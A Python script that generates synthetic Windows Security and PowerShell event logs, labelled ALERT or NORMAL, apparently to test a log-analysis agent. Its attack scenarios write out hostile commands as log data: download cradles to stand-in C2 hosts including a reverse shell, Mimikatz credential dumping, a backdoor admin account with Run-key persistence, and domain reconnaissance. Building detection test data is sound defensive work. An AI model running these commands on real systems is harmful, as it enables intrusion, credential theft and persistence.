"""
Script Tự động Sinh Bộ Dữ liệu Kiểm thử Đa dạng cho Windows Event Log.
Tuân thủ chuẩn XML Windows Event Log (Security + PowerShell) và định dạng ISO 8601 UTC.
"""
import argparse
import json
import os
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Đảm bảo UTF-8 cho Windows console
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if sys.stderr and hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

BASE = Path(__file__).resolve().parent.parent  # thư mục gốc winlog-agent (file này ở core/)
DATA_DIR = BASE / "data"

XML_HEADER = "<Events>"
XML_FOOTER = "</Events>"


def format_win_time(dt: datetime) -> str:
    """Format chuẩn thời gian Windows Event: YYYY-MM-DDTHH:MM:SS.0000000Z (UTC chuẩn không trùng offset)."""
    return dt.strftime("%Y-%m-%dT%H:%M:%S.0000000Z")


def create_security_event_xml(
    event_id: int,
    time_str: str,
    record_id: int,
    data_dict: dict,
    computer: str = "WORKSTATION-SOC.corp.local",
) -> str:
    """Tạo XML chuẩn cho một Security Event (4624, 4625, 4648, 4688) với đầy đủ cấu trúc."""
    # Các trường mặc định để bảo đảm độ chân thực như log Windows thật
    defaults = {
        "SubjectUserSid": "S-1-5-21-3686947128-2095841011-3536572084-1001",
        "SubjectUserName": "-",
        "SubjectDomainName": "CORP",
        "SubjectLogonId": "0x3e7",
        "TargetUserSid": "S-1-5-21-3686947128-2095841011-3536572084-1002",
        "TargetUserName": "-",
        "TargetDomainName": "CORP",
        "TargetLogonId": "0x0",
        "LogonType": "2",
        "IpAddress": "-",
        "WorkstationName": "WORKSTATION-SOC",
        "Status": "0x0",
        "SubStatus": "0x0",
        "ProcessId": "0x4",
        "NewProcessId": "0x1200",
        "NewProcessName": "",
        "CommandLine": "",
        "ParentProcessName": "C:\\Windows\\System32\\explorer.exe",
    }
    merged = {**defaults, **data_dict}
    data_items = "".join([f"<Data Name='{k}'>{merged[k]}</Data>" for k in merged if merged[k] != ""])

    return (
        f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System>"
        f"<Provider Name='Microsoft-Windows-Security-Auditing' Guid='{{54849625-5478-4994-A5BA-3E3B0328C30D}}'/>"
        f"<EventID>{event_id}</EventID>"
        f"<Version>2</Version>"
        f"<Level>0</Level>"
        f"<Task>12544</Task>"
        f"<Opcode>0</Opcode>"
        f"<Keywords>0x8020000000000000</Keywords>"
        f"<TimeCreated SystemTime='{time_str}'/>"
        f"<EventRecordID>{record_id}</EventRecordID>"
        f"<Correlation/>"
        f"<Execution ProcessID='4' ThreadID='204'/>"
        f"<Channel>Security</Channel>"
        f"<Computer>{computer}</Computer>"
        f"<Security/>"
        f"</System>"
        f"<EventData>{data_items}</EventData>"
        f"</Event>"
    )


def create_powershell_event_xml(
    script_text: str,
    time_str: str,
    record_id: int,
    computer: str = "WORKSTATION-SOC.corp.local",
) -> str:
    """Tạo XML chuẩn cho một PowerShell Event (4104 ScriptBlock Logging)."""
    escaped_text = (
        script_text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("'", "&apos;")
        .replace('"', "&quot;")
    )
    return (
        f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System>"
        f"<Provider Name='Microsoft-Windows-PowerShell' Guid='{{a0c1853b-5c40-4b15-8766-3cf1c58f985a}}'/>"
        f"<EventID>4104</EventID>"
        f"<Version>1</Version>"
        f"<Level>3</Level>"
        f"<Task>2</Task>"
        f"<Opcode>15</Opcode>"
        f"<Keywords>0x0</Keywords>"
        f"<TimeCreated SystemTime='{time_str}'/>"
        f"<EventRecordID>{record_id}</EventRecordID>"
        f"<Correlation ActivityID='{{AABBCCDD-1234-5678-ABCD-AABBCCDDEEFF}}'/>"
        f"<Execution ProcessID='4096' ThreadID='4100'/>"
        f"<Channel>Microsoft-Windows-PowerShell/Operational</Channel>"
        f"<Computer>{computer}</Computer>"
        f"<Security UserID='S-1-5-21-3686947128-2095841011-3536572084-1001'/>"
        f"</System>"
        f"<EventData>"
        f"<Data Name='MessageNumber'>1</Data>"
        f"<Data Name='MessageTotal'>1</Data>"
        f"<Data Name='ScriptBlockText'>{escaped_text}</Data>"
        f"<Data Name='ScriptBlockId'>12345678-abcd-ef01-2345-67890abcdef0</Data>"
        f"<Data Name='Path'></Data>"
        f"</EventData>"
        f"</Event>"
    )


def write_case_dataset(case_id: str, ground_truth: str, actions: str, sec_events: list, ps_events: list):
    """Ghi dữ liệu ca kiểm thử vào thư mục data/<case_id>."""
    case_dir = DATA_DIR / case_id
    case_dir.mkdir(parents=True, exist_ok=True)

    sec_xml = XML_HEADER + "".join(sec_events) + XML_FOOTER
    ps_xml = XML_HEADER + "".join(ps_events) + XML_FOOTER

    (case_dir / "security.xml").write_text(sec_xml, encoding="utf-8")
    (case_dir / "powershell.xml").write_text(ps_xml, encoding="utf-8")

    manifest = {
        "case_id": case_id,
        "ground_truth": ground_truth,
        "actions": actions,
        "security_count": len(sec_events),
        "powershell_count": len(ps_events),
        "created_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    (case_dir / "manifest.json").write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print(f"  [+] Đã tạo ca: {case_id:<32} | Nhãn: {ground_truth:<6} | Sec: {len(sec_events):<2} | PS: {len(ps_events):<2}")


# ==============================================================================
# CÁC KỊCH BẢN TẤN CÔNG & LÀNH TÍNH
# ==============================================================================

def build_case_attack_bruteforce(base_time: datetime):
    """Kịch bản 1: Tấn công dò mật khẩu (Brute Force liên tiếp 8 lần rồi đăng nhập thành công)."""
    sec, ps = [], []
    rec_id = 2000

    for i in range(8):
        t = format_win_time(base_time + timedelta(seconds=i * 4))
        rec_id += 1
        sec.append(create_security_event_xml(
            event_id=4625,
            time_str=t,
            record_id=rec_id,
            data_dict={
                "TargetUserName": "admin_backup",
                "LogonType": "3",
                "IpAddress": "10.10.15.66",
                "WorkstationName": "KALI-LINUX-BOT",
                "Status": "0xC000006D",
                "SubStatus": "0xC000006A",
            }
        ))

    t_succ = format_win_time(base_time + timedelta(seconds=40))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4624,
        time_str=t_succ,
        record_id=rec_id,
        data_dict={
            "TargetUserName": "admin_backup",
            "TargetLogonId": "0x543210",
            "LogonType": "3",
            "IpAddress": "10.10.15.66",
        }
    ))

    t_cmd = format_win_time(base_time + timedelta(seconds=45))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t_cmd,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "admin_backup",
            "SubjectLogonId": "0x543210",
            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe",
        }
    ))

    write_case_dataset(
        case_id="case_attack_bruteforce",
        ground_truth="ALERT",
        actions="8 lần đăng nhập thất bại liên tiếp vào tài khoản admin_backup từ IP 10.10.15.66; sau đó đăng nhập thành công và mở cmd.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_attack_powershell_c2(base_time: datetime):
    """Kịch bản 2: Tải và thực thi mã độc C2 từ xa qua PowerShell Download Cradle."""
    sec, ps = [], []
    rec_id = 3000

    t_logon = format_win_time(base_time)
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4624,
        time_str=t_logon,
        record_id=rec_id,
        data_dict={
            "TargetUserName": "finance_user",
            "TargetLogonId": "0x8899AA",
            "LogonType": "2",
        }
    ))

    t_ps = format_win_time(base_time + timedelta(seconds=5))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t_ps,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "finance_user",
            "SubjectLogonId": "0x8899AA",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
        }
    ))

    t_script = format_win_time(base_time + timedelta(seconds=6))
    ps.append(create_powershell_event_xml(
        script_text="IEX (New-Object Net.WebClient).DownloadString('http://c2-malicious.xyz/beacon.ps1'); Invoke-ReflectivePEInjection -PEPath C:\\Temp\\payload.bin",
        time_str=t_script,
        record_id=301,
    ))

    write_case_dataset(
        case_id="case_attack_powershell_c2",
        ground_truth="ALERT",
        actions="Chạy PowerShell ẩn danh với Download Cradle tải payload từ máy chủ C2 http://c2-malicious.xyz/beacon.ps1.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_attack_persistence_backdoor(base_time: datetime):
    """Kịch bản 3: Leo thang đặc quyền, tạo Backdoor User và gán Registry Run Persistence."""
    sec, ps = [], []
    rec_id = 4000

    t1 = format_win_time(base_time + timedelta(seconds=5))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t1,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "local_hacker",
            "NewProcessName": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net user shadow_admin P@ssw0rd999# /add",
        }
    ))

    t2 = format_win_time(base_time + timedelta(seconds=10))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t2,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "local_hacker",
            "NewProcessName": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net localgroup Administrators shadow_admin /add",
        }
    ))

    t3 = format_win_time(base_time + timedelta(seconds=15))
    ps.append(create_powershell_event_xml(
        script_text="Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsSecurityUpdate' -Value 'C:\\ProgramData\\backdoor.exe'",
        time_str=t3,
        record_id=401,
    ))

    write_case_dataset(
        case_id="case_attack_persistence_backdoor",
        ground_truth="ALERT",
        actions="Tạo tài khoản ngầm shadow_admin, gán quyền Administrators và thiết lập khóa khởi động Run Persistence.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_attack_credential_dump(base_time: datetime):
    """Kịch bản 4: Trích xuất mật khẩu bộ nhớ (Credential Dumping với Mimikatz)."""
    sec, ps = [], []
    rec_id = 5000

    t1 = format_win_time(base_time + timedelta(seconds=2))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t1,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "Administrator",
            "NewProcessName": "C:\\Windows\\System32\\whoami.exe",
            "CommandLine": "whoami /priv",
        }
    ))

    t2 = format_win_time(base_time + timedelta(seconds=8))
    ps.append(create_powershell_event_xml(
        script_text="[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('http://sec-tool.lab/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\" exit'",
        time_str=t2,
        record_id=501,
    ))

    write_case_dataset(
        case_id="case_attack_credential_dump",
        ground_truth="ALERT",
        actions="Kiểm tra SeDebugPrivilege và chạy script Invoke-Mimikatz để dump mật khẩu từ bộ nhớ tiến trình lsass.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_attack_recon_discovery(base_time: datetime):
    """Kịch bản 5: Khám phá và trinh sát mạng nội bộ (System & Network Discovery)."""
    sec, ps = [], []
    rec_id = 6000

    for i in range(3):
        t = format_win_time(base_time + timedelta(seconds=i * 5))
        rec_id += 1
        sec.append(create_security_event_xml(
            event_id=4625,
            time_str=t,
            record_id=rec_id,
            data_dict={
                "TargetUserName": "victim_operator",
                "LogonType": "3",
                "IpAddress": "192.168.10.88",
            }
        ))

    commands = [
        "whoami",
        "net user",
        "net group \"Domain Admins\" /domain",
        "systeminfo",
        "nltest /dclist:corp.local",
    ]
    for i, cmd in enumerate(commands, start=1):
        t_cmd = format_win_time(base_time + timedelta(seconds=20 + i * 5))
        rec_id += 1
        sec.append(create_security_event_xml(
            event_id=4688,
            time_str=t_cmd,
            record_id=rec_id,
            data_dict={
                "SubjectUserName": "victim_operator",
                "NewProcessName": f"C:\\Windows\\System32\\{cmd.split()[0]}.exe",
                "CommandLine": cmd,
            }
        ))

    write_case_dataset(
        case_id="case_attack_recon_discovery",
        ground_truth="ALERT",
        actions="Dò quét tài khoản đi kèm chuỗi lệnh khám phá mạng: whoami, net user, net group Domain Admins, nltest.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_normal_office_worker(base_time: datetime):
    """Kịch bản 6: Nhân viên văn phòng đăng nhập và làm việc bình thường."""
    sec, ps = [], []
    rec_id = 7000

    t_logon = format_win_time(base_time)
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4624,
        time_str=t_logon,
        record_id=rec_id,
        data_dict={
            "TargetUserName": "nguyen_van_a",
            "TargetLogonId": "0x123456",
            "LogonType": "2",
        }
    ))

    apps = [
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE"),
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "\"EXCEL.EXE\" \"C:\\Users\\User\\Documents\\BaoCaoQuy.xlsx\""),
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "\"WINWORD.EXE\" \"C:\\Users\\User\\Documents\\BienBanHop.docx\""),
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "\"chrome.exe\" --profile-directory=\"Default\" https://mail.google.com"),
    ]
    for i, (path, cmd) in enumerate(apps, start=1):
        t_app = format_win_time(base_time + timedelta(seconds=i * 10))
        rec_id += 1
        sec.append(create_security_event_xml(
            event_id=4688,
            time_str=t_app,
            record_id=rec_id,
            data_dict={
                "SubjectUserName": "nguyen_van_a",
                "SubjectLogonId": "0x123456",
                "NewProcessName": path,
                "CommandLine": cmd,
            }
        ))

    write_case_dataset(
        case_id="case_normal_office_worker",
        ground_truth="NORMAL",
        actions="Người dùng nguyen_van_a đăng nhập hợp lệ, mở Outlook, Excel báo cáo, Word và duyệt mail qua Chrome.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_normal_sysadmin_task(base_time: datetime):
    """Kịch bản 7: Quản trị viên hệ thống kiểm tra tình trạng dịch vụ máy tính."""
    sec, ps = [], []
    rec_id = 8000

    t_logon = format_win_time(base_time)
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4624,
        time_str=t_logon,
        record_id=rec_id,
        data_dict={
            "TargetUserName": "admin_sys",
            "TargetLogonId": "0x778899",
            "LogonType": "2",
        }
    ))

    cmds = [
        ("ipconfig.exe", "ipconfig /all"),
        ("ping.exe", "ping 8.8.8.8 -n 4"),
        ("hostname.exe", "hostname"),
    ]
    for i, (proc, cmd) in enumerate(cmds, start=1):
        t_cmd = format_win_time(base_time + timedelta(seconds=i * 5))
        rec_id += 1
        sec.append(create_security_event_xml(
            event_id=4688,
            time_str=t_cmd,
            record_id=rec_id,
            data_dict={
                "SubjectUserName": "admin_sys",
                "SubjectLogonId": "0x778899",
                "NewProcessName": f"C:\\Windows\\System32\\{proc}",
                "CommandLine": cmd,
            }
        ))

    t_ps = format_win_time(base_time + timedelta(seconds=25))
    ps.append(create_powershell_event_xml(
        script_text="Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 10; Get-PSDrive -PSProvider FileSystem",
        time_str=t_ps,
        record_id=801,
    ))

    write_case_dataset(
        case_id="case_normal_sysadmin_task",
        ground_truth="NORMAL",
        actions="Quản trị viên kiểm tra cấu hình mạng (ipconfig, ping) và giám sát trạng thái dịch vụ (Get-Service).",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_normal_developer(base_time: datetime):
    """Kịch bản 8: Lập trình viên chạy Git, build và kiểm thử mã nguồn."""
    sec, ps = [], []
    rec_id = 9000

    dev_cmds = [
        ("C:\\Program Files\\Git\\bin\\git.exe", "git clone https://github.com/my-org/project-demo.git"),
        ("C:\\Program Files\\Git\\bin\\git.exe", "git status"),
        ("C:\\Program Files\\Python311\\python.exe", "python -m unittest discover tests"),
        ("C:\\Program Files\\Docker\\Docker\\resources\\bin\\docker.exe", "docker ps -a"),
    ]
    for i, (path, cmd) in enumerate(dev_cmds, start=1):
        t_cmd = format_win_time(base_time + timedelta(seconds=i * 8))
        rec_id += 1
        sec.append(create_security_event_xml(
            event_id=4688,
            time_str=t_cmd,
            record_id=rec_id,
            data_dict={
                "SubjectUserName": "developer_dev",
                "NewProcessName": path,
                "CommandLine": cmd,
            }
        ))

    t_ps = format_win_time(base_time + timedelta(seconds=40))
    ps.append(create_powershell_event_xml(
        script_text="$env:NODE_ENV = 'development'; npm test; Write-Host 'Build complete!'",
        time_str=t_ps,
        record_id=901,
    ))

    write_case_dataset(
        case_id="case_normal_developer",
        ground_truth="NORMAL",
        actions="Lập trình viên làm việc thông thường: git clone, git status, chạy unit test python, docker ps.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_normal_typo_login(base_time: datetime):
    """Kịch bản 9: Người dùng bình thường gõ nhầm mật khẩu 1 lần rồi gõ đúng ngay (Không phải tấn công)."""
    sec, ps = [], []
    rec_id = 10000

    t_fail = format_win_time(base_time)
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4625,
        time_str=t_fail,
        record_id=rec_id,
        data_dict={
            "TargetUserName": "le_thi_b",
            "LogonType": "2",
            "WorkstationName": "PC-ACCOUNTING-02",
            "Status": "0xC000006D",
            "SubStatus": "0xC000006A",
        }
    ))

    t_succ = format_win_time(base_time + timedelta(seconds=5))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4624,
        time_str=t_succ,
        record_id=rec_id,
        data_dict={
            "TargetUserName": "le_thi_b",
            "TargetLogonId": "0xABCDEF",
            "LogonType": "2",
        }
    ))

    t_np = format_win_time(base_time + timedelta(seconds=12))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t_np,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "le_thi_b",
            "SubjectLogonId": "0xABCDEF",
            "NewProcessName": "C:\\Windows\\System32\\notepad.exe",
            "CommandLine": "notepad.exe C:\\Users\\User\\Desktop\\note.txt",
        }
    ))

    write_case_dataset(
        case_id="case_normal_typo_login",
        ground_truth="NORMAL",
        actions="Người dùng le_thi_b gõ nhầm mật khẩu 1 lần duy nhất, sau đó đăng nhập thành công và mở Notepad ghi chú.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_normal_backup_script(base_time: datetime):
    """Kịch bản 10: Tập lệnh PowerShell tự động sao lưu dữ liệu hợp lệ (Scheduled Backup)."""
    sec, ps = [], []
    rec_id = 11000

    # Tiến trình powershell.exe chạy script
    t_sec = format_win_time(base_time)
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t_sec,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "backup_service",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup_daily.ps1",
        }
    ))

    t_ps = format_win_time(base_time + timedelta(seconds=2))
    ps.append(create_powershell_event_xml(
        script_text="""# Daily backup script
$source = "D:\\CompanyData"
$destination = "E:\\BackupDaily\\Data_" + (Get-Date -Format 'yyyyMMdd') + ".zip"
Compress-Archive -Path $source -DestinationPath $destination -Force
Write-Output "Daily backup finished successfully at $(Get-Date)"
""",
        time_str=t_ps,
        record_id=1101,
    ))

    write_case_dataset(
        case_id="case_normal_backup_script",
        ground_truth="NORMAL",
        actions="Tác vụ tự động chạy lệnh Compress-Archive sao lưu thư mục công ty D:\\CompanyData vào ổ E:\\BackupDaily.",
        sec_events=sec,
        ps_events=ps,
    )


def build_case_mixed_stealth_attack(base_time: datetime):
    """Kịch bản 11: Kịch bản hỗn hợp — Người dùng làm việc bình thường trong khi ngầm bị mã độc C2 kích hoạt."""
    sec, ps = [], []
    rec_id = 12000

    t_word = format_win_time(base_time)
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t_word,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "hr_manager",
            "NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "CommandLine": "WINWORD.EXE Resume.docx",
        }
    ))

    t_macro = format_win_time(base_time + timedelta(seconds=4))
    rec_id += 1
    sec.append(create_security_event_xml(
        event_id=4688,
        time_str=t_macro,
        record_id=rec_id,
        data_dict={
            "SubjectUserName": "hr_manager",
            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c start /b powershell.exe -ep bypass -nop -w hidden (New-Object Net.WebClient).DownloadString('http://threat-actor.biz/rev.ps1')",
        }
    ))

    t_ps = format_win_time(base_time + timedelta(seconds=6))
    ps.append(create_powershell_event_xml(
        script_text="IEX (New-Object Net.WebClient).DownloadString('http://threat-actor.biz/rev.ps1')",
        time_str=t_ps,
        record_id=1201,
    ))

    write_case_dataset(
        case_id="case_mixed_stealth_attack",
        ground_truth="ALERT",
        actions="Tài liệu Word kích hoạt mã độc macro chạy ngầm PowerShell tải reverse shell qua mạng.",
        sec_events=sec,
        ps_events=ps,
    )


def main():
    parser = argparse.ArgumentParser(description="Tạo bộ dữ liệu log kiểm thử đa dạng cho Windows Event Log.")
    parser.add_argument("--clean", action="store_true", help="Xóa các ca dữ liệu sinh tự động")
    args = parser.parse_args()

    generated_case_names = [
        "case_attack_bruteforce",
        "case_attack_powershell_c2",
        "case_attack_persistence_backdoor",
        "case_attack_credential_dump",
        "case_attack_recon_discovery",
        "case_normal_office_worker",
        "case_normal_sysadmin_task",
        "case_normal_developer",
        "case_normal_typo_login",
        "case_normal_backup_script",
        "case_mixed_stealth_attack",
    ]

    if args.clean:
        print("[*] Đang xóa các ca kiểm thử tự sinh...")
        for name in generated_case_names:
            p = DATA_DIR / name
            if p.is_dir():
                import shutil
                shutil.rmtree(p)
                print(f"  [-] Đã xóa: {name}")
        print("[✓] Hoàn tất dọn dẹp!")
        return

    print("=" * 80)
    print("      KHỞI TẠO BỘ DỮ LIỆU KIỂM THỬ ĐA DẠNG CHO AI AGENT WINLOG")
    print("=" * 80)
    print(f" - Thư mục lưu trữ : {DATA_DIR}")
    print(f" - Số kịch bản mới  : {len(generated_case_names)}")
    print("-" * 80)

    now = datetime(2026, 10, 25, 8, 30, 0)

    # 1. Nhóm tấn công
    build_case_attack_bruteforce(now)
    build_case_attack_powershell_c2(now + timedelta(minutes=10))
    build_case_attack_persistence_backdoor(now + timedelta(minutes=20))
    build_case_attack_credential_dump(now + timedelta(minutes=30))
    build_case_attack_recon_discovery(now + timedelta(minutes=40))

    # 2. Nhóm lành tính
    build_case_normal_office_worker(now + timedelta(minutes=50))
    build_case_normal_sysadmin_task(now + timedelta(minutes=60))
    build_case_normal_developer(now + timedelta(minutes=70))
    build_case_normal_typo_login(now + timedelta(minutes=80))
    build_case_normal_backup_script(now + timedelta(minutes=90))

    # 3. Nhóm hỗn hợp
    build_case_mixed_stealth_attack(now + timedelta(minutes=100))

    print("=" * 80)
    print(f"[✓] ĐÃ KHỞI TẠO XONG {len(generated_case_names)} CA DỮ LIỆU ĐA DẠNG!")
    print("=" * 80)


if __name__ == "__main__":
    main()
